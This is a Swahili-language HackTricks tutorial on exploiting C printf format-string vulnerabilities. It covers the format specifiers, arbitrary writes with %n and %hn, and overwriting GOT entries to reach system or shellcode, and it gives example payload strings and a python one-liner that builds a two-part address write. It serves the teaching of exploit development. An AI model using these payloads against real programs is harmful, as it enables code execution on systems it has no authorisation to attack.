# Maudhui ya Format

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikionekana kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Taarifa Msingi

Katika C **`printf`** ni kazi inayoweza kutumika kwa **kusambaza** string fulani. **Parameter ya kwanza** ambayo kazi hii inatarajia ni **maandishi ghafi yenye formatters**. **Parameta zinazofuata** zinatarajiwa kuwa **thamani** za **kubadilisha** **formatters** kutoka kwenye maandishi ghafi.

Udhaifu unaonekana wakati **maandishi ya muhalifu yanawekwa kama hoja ya kwanza** kwa kazi hii. Muhalifu ataweza kutengeneza **kuingia maalum kwa kudhuru** uwezo wa **formati ya printf** kuandika **data yoyote kwenye anwani yoyote**. Hivyo kuweza **kutekeleza kanuni za aina yoyote**. 

Formatters:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **huiandika** **idadi ya baits zilizoandikwa** kwenye **anwani iliyotajwa. Kuandika** idadi **ya baits** kama nambari ya hex tunayohitaji **kuandika data yoyote**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### **Mzunguko wa Kutumia Udhaifu**

Kama ilivyoelezwa hapo awali, udhaifu huu unaruhusu **kuandika chochote kwenye anwani yoyote (kuandika kiholela).**

Lengo ni **kubadilisha** **anwani** ya **kazi** katika **GOT** meza ambayo itaitwa baadaye. Kimsingi tunaweza kuweka **anwani kwa shellcode** iliyopo katika sehemu inayoweza kutekelezwa, lakini ni uwezekano mkubwa hutaweza kuandika shellcode katika sehemu inayoweza kutekelezwa.\
Kwa hivyo chaguo lingine ni **kubadilisha** **kazi** ambayo **inapokea** **vigezo** vyake kutoka kwa **mtumiaji** na **kuielekeza** kwa kazi ya **`system`**.

Kuandika anwani, kawaida hatua 2 hufanywa: Unaweza **kwanza kuandika 2Bytes** ya anwani na kisha nyingine 2. Kufanya hivyo **`$hn`** hutumiwa.

**HOB** inaitwa kwa 2 byte za juu za anwani\
**LOB** inaitwa kwa 2 byte za chini za anwani

Kwa hivyo, kwa sababu ya jinsi format string inavyofanya kazi unahitaji **kuandika kwanza kidogo** kati ya \[HOB, LOB] na kisha nyingine.

Ikiwa HOB < LOB\
`[anwani+2][anwani]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Ikiwa HOB > LOB\
`[anwani+2][anwani]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

## Kigezo cha Pwntools

Unaweza kupata kigezo cha kuandaa shambulio kwa aina hii ya udhaifu katika:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka mwanzo hadi kuwa shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa kwenye HackTricks**? au ungependa kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) **kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
